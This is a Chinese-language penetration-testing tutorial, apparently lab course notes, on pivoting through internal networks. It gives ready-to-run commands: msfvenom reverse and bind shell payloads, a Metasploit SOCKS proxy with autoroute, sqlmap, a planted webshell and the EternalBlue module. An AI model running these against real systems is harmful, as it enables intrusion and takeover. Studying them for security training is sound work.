## 外网渗透与突破口获取

上一节我们介绍了信息收集的基本方法，本节中我们来看看如何利用收集到的信息寻找突破口。

我们通过Nmap等工具对目标IP进行端口扫描，发现其开放了多个端口，如21、22、80、888、3306等。每个端口都对应着特定的服务，也意味着可能存在相应的攻击面。

*   **21端口 (FTP)**：尝试进行弱口令爆破，若成功可直接登录获取文件。
*   **22端口 (SSH)**：尝试弱口令爆破或利用OpenSSH历史漏洞。
*   **3306端口 (MySQL)**：若允许远程连接，可尝试弱口令爆破，成功后直接操作数据库。
*   **888端口 (宝塔面板)**：通常需要特定的随机目录才能访问后台登录页面，需先获取该路径。
*   **80端口 (Web服务)**：这是最常见的突破口。通过访问Web服务、目录爆破等方式，寻找可利用的漏洞点。

## 内网存活主机探测

![](img/e83407721fddc14bdd8af600c5d4a3c7_80.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_82.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_84.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_86.png)

发现内网网段后，我们需要探测该网段内存活的主机。

以下是使用Shell脚本通过Ping命令进行存活探测的方法：
```bash
#!/bin/bash
for i in {1..254}
do
    ip=192.168.22.$i
    ping -c 1 -W 1 $ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo $ip is OK
    else
        echo $ip is NO
    fi
done
```
**注意**：在Windows上编写脚本上传至Linux时，需注意编码和换行符问题，建议在Linux环境下直接编写或使用 `dos2unix` 命令转换。

执行脚本后，我们发现内网中除了跳板机自身 (`192.168.22.1`)，还有另一台存活主机：`192.168.22.2`。

## 建立Socks代理通道

![](img/e83407721fddc14bdd8af600c5d4a3c7_99.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_101.png)

为了更方便地利用工具对内网主机 `192.168.22.2` 进行测试，我们需要将跳板机的Shell会话转移到功能更强大的渗透框架（如Metasploit, MSF）中，并建立Socks代理。

![](img/e83407721fddc14bdd8af600c5d4a3c7_103.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_105.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_107.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_109.png)

**步骤一：反弹Shell到MSF**
1.  在MSF中生成Linux系统的木马：
    ```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<你的MSF_IP> LPORT=6667 -f elf -o msf.elf
    ```
2.  通过Webshell将 `msf.elf` 上传至跳板机的 `/tmp` 目录，并赋予执行权限。
3.  在MSF中设置监听：
    ```bash
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST <你的MSF_IP>
    set LPORT 6667
    exploit -j
    ```
4.  在跳板机上执行 `msf.elf`，成功在MSF中获得一个meterpreter会话（假设为 `session 5`）。

**步骤二：添加路由并启动Socks代理**
1.  在 `session 5` 中添加通向内网 `22` 网段的路由：
    ```bash
    run autoroute -s 192.168.22.0/24
    run autoroute -p # 查看路由
    ```
2.  在MSF后台启动Socks5代理服务：
    ```bash
    use auxiliary/server/socks_proxy
    set VERSION 5
    run
    ```
    代理服务默认监听在 `1080` 端口。

**步骤三：配置代理访问内网**
现在，我们可以将本地的工具流量通过MSF建立的Socks5代理通道，转发到内网。

*   **使用 `proxychains` 命令行工具**：
    ```bash
    proxychains curl http://192.168.22.2
    proxychains nmap -sT -Pn 192.168.22.2 # 注意必须加-Pn禁止Ping扫描
    ```
*   **配置浏览器或图形化工具**：
    在相应工具的代理设置中，填入Socks5代理服务器地址（你的MSF_IP）和端口（1080）。

![](img/e83407721fddc14bdd8af600c5d4a3c7_111.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_113.png)

通过代理，我们成功扫描到内网主机 `192.168.22.2` 开放了80端口，并发现其上运行着一个存在SQL注入漏洞的CMS系统。

## 内网横向渗透

上一节我们通过代理对内网主机进行了初步探测，本节中我们来看看如何进行更深层次的横向移动。

**对内网Web服务的渗透**
1.  通过 `sqlmap` 配合代理，对CMS的SQL注入点进行利用，成功获取后台管理员账号密码。
    ```bash
    proxychains sqlmap -u "http://192.168.22.2/vuln.php?id=1" --proxy=socks5://<MSF_IP>:1080 ...
    ```
2.  登录后台，通过编辑模板文件插入一句话木马，获得该内网主机的Webshell。

![](img/e83407721fddc14bdd8af600c5d4a3c7_115.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_117.png)

**多层内网穿透**
1.  通过Webshell，在 `192.168.22.2` 上执行 `ifconfig`，发现其还有另一块网卡，属于 `192.168.33.0/24` 网段。
2.  由于该主机无法直接出网，我们使用MSF生成一个正向连接的木马。
    ```bash
    msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=6668 -f elf -o msf2.elf
    ```
3.  将木马上传至 `192.168.22.2` 并执行，它在本地监听6668端口。
4.  在MSF中，通过已控制的 `session 5`（能访问22网段）去连接这个正向端口，从而获得 `192.168.22.2` 的meterpreter会话（`session 7`）。
    ```bash
    use exploit/multi/handler
    set payload linux/x64/meterpreter/bind_tcp
    set RHOST 192.168.22.2
    set LPORT 6668
    exploit
    ```
5.  在 `session 7` 中添加通向 `33` 网段的路由：
    ```bash
    run autoroute -s 192.168.33.0/24
    ```
6.  此时，我们之前建立的Socks代理（1080端口）的流量，在MSF内部会通过 `session 7` 路由到 `33` 网段。我们即可通过代理扫描 `192.168.33.33`。

![](img/e83407721fddc14bdd8af600c5d4a3c7_119.png)

![](img/e83407721fddc14bdd8af600c5d4a3c7_121.png)

**最终目标攻克**
1.  扫描发现 `192.168.33.33` 开放了445端口。
2.  直接利用MSF的永恒之蓝漏洞利用模块进行攻击：
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.33.33
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST <MSF_IP> # 注意，这里反弹Shell的流量会经过多层代理回到MSF
    set LPORT 4444
    exploit
    ```
3.  攻击成功，获得 `system` 权限的Shell。
4.  添加用户并利用3389端口进行远程桌面连接。连接时，需使用全局代理工具（如Proxifier）将 `mstsc.exe` 程序的流量导向Socks5代理，即可成功登录。
